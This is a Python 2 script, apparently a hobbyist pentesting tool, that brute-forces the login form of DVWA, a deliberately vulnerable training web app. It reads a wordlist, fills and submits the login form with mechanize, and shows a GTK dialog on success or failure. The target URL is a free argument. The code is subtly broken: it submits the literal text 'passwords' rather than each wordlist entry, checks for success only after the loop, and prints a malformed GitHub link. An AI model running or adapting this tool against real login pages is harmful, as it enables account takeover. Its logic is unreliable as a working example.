#!/usr/bin/env python
# Author: Reznov - Pentester and hacker
# Website: http://xakepu.blogspot.com
# Tool: Automated DVWA bruteforcer 
# Github: http://www.github.com/reznov1


import urllib2
import optparse
import sys
import time
import random

try:
  from termcolor import colored,cprint
  import mechanize
  import gtk
  import cookielib

except:
  print "[!] Please install the modules that tool didn't found !!"
  exit(0)

# here some defaults variables to use later on including colors .
suc = " You've found it, well done "
fail = " Oooops, try again !! "
response = 200
error = 404
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERL = '\033[4m'
ENDC = '\033[0m'
backBlack = '\033[40m'
backRed = '\033[41m'
backGreen = '\033[42m'
backYellow = '\033[43m'
backBlue = '\033[44m'
backMagenta = '\033[45m'
backCyan = '\033[46m'
backWhite = '\033[47m'
print_white = lambda x: cprint(x, 'white')
print_green = lambda x: cprint(x, 'green')
print_cyan = lambda x: cprint(x, 'cyan')
print_red = lambda x: cprint(x, 'red')
print_orange = lambda x: cprint(x, 'orange')


def destroy(self, widget, data=None):
  print "\n You closed the tool . "
  gtk.main_quit()


def success():

  about = gtk.AboutDialog()
  about.set_program_name(suc)
  about.set_logo(gtk.gdk.pixbuf_new_from_file("success.png"))
  about.set_comments("This tool written in python")
  about.set_website("http://xakepu.blogspot.com")
  about.set_copyright("(c) Reznov - 2014")
  about.run()
  about.destroy()

def failed():

  about = gtk.AboutDialog()
  about.set_program_name(fail)
  about.set_logo(gtk.gdk.pixbuf_new_from_file("try.png"))
  about.set_comments("This tool written in python")
  about.set_website("http://xakepu.blogspot.com")
  about.set_copyright("(c) Reznov - 2014")
  about.run()
  about.destroy()


def checkingVSsecurity(url, username, wordlist):

  print_white('''

  ______      ____        ___    
  |  _ \ \   / /\ \      / / \   
  | | | \ \ / /  \ \ /\ / / _ \  
  | |_| |\ V /    \ V  V / ___ \ 
  |____/  \_/      \_/\_/_/   \_\\

   ____             _       _____
  | __ ) _ __ _   _| |_ ___|  ___|__  _ __ ___ ___ _ __ 
  |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '__|
  | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |   
  |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|  


  Author: Reznov - Pentester and hacker
  Website: http://xakepu.blogspot.com
  Github: https://https://github.com/reznov11
  Twitter: @pentester11

  ''')

  time.sleep(2)

  try:

    host = urllib2.urlopen(url)

    if host.code == response:
      print_white("\n\n[*] Starting at %s " %time.strftime("%Y %X"))
      time.sleep(1.5)
      print_cyan("\n[+] Response Ok: %s " % url)
      time.sleep(1.5)
      return

    elif host.code == error:
      print_red("\n[x] " +str(error)+ " Link not correct %s" % url)

    else:
      pass

  finally:

    file = open(wordlist, "r")
    passwords = file.readlines()
    print "\n","[*]",len(passwords),"Passwords loaded"
    with open(wordlist) as f:
      for lines in f:
        print "\n[--] Trying: "+lines.split('\n')[0]
        time.sleep(0.5)
        pass

        fetch = mechanize.Browser()
        cookie = cookielib.LWPCookieJar()
        fetch.set_handle_robots(False)
        fetch.set_handle_equiv(True)
        fetch.set_handle_referer(True)
        fetch.set_handle_redirect(True)
        fetch.set_cookiejar(cookie)
        fetch.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        fetch.open(url)
        fetch.select_form(nr=0)
        fetch.form['username'] = username
        fetch.form['password'] = "passwords"
        fetch.submit()

      if "Welcome" in fetch.title():
        success()
        return

      else:
        failed()
        exit(0)

def main():

  try:

    parser = optparse.OptionParser("\n--url <the link of the bruteforces page>" +\
      "\n--username <Dvwa username>"  "\n--password <wordlist to bruteforce>")

    parser.add_option("--url: ", dest='url', type='string', \
      help='past the link you want to bruteforce')

    parser.add_option("--username: ", dest='username', type='string', \
      help='Dvwa username, the default is [admin]')

    parser.add_option("--passlist: ", dest='wordlist', type='string', \
      help='File contain the passwords to try.')


    (options, args) = parser.parse_args()
    if(options.url == None) | (options.username == None) | (options.wordlist == None):
      print parser.usage
      print "[!] Please fill the options ."
      exit(0)

    else:
      url2 = options.url
      username = options.username
      password = options.wordlist
      checkingVSsecurity(url2, username, password)


  except urllib2.HTTPError, error:
    print PURPLE + BOLD + "\n\n[!] Please check the link " + BOLD + CYAN + url2 + ENDC

  except urllib2.URLError, error:
    print BLUE + BOLD + "\n\n[!] The host name not correct %s" %url2 + BOLD + CYAN + ENDC

  except IOError:
  	print "\n[!] Can't find %s !!." %password
  
  except KeyboardInterrupt:
    print "\n[!] You closed the tool."

if __name__ == "__main__":
  main()
